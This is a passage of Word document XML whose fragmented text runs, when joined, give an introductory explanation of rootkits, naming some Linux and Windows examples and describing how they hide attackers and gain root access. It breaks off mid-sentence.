          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>wn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Li</w:t>
      </w:r>
      <w:r>
        <w:t>nux</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ude</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:t>RK,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>Orn,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and Adore</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>so</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="10"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-11"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ndows</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ude N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:t>OO</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-19"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>Kap, and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>s.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="74" w:firstLine="710"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>Not</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>are</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>des</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gned</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>de</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>presence</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of an</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>acke</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hey</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>are</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>so</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>sed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ga</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n fu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ure</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="59"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ad</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ra</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:t>el</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="59"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">)  access,  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>aunch  d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>bu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed  den</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>al</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="59"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of  serv</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ce</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="59"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(ddos),</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="58"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>or  ob</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nanc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>al</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>or</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>conf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>den</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>al</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nfor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>cause</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>are</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>de</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>sen</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>an a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>tt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>cke</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r>
        <w:t>s ne</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>sary</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o unders</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>and how a roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>func</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ons.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="68" w:firstLine="710"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>When</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">t </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ed,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t overwr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>any</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ands</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>used</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a da</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
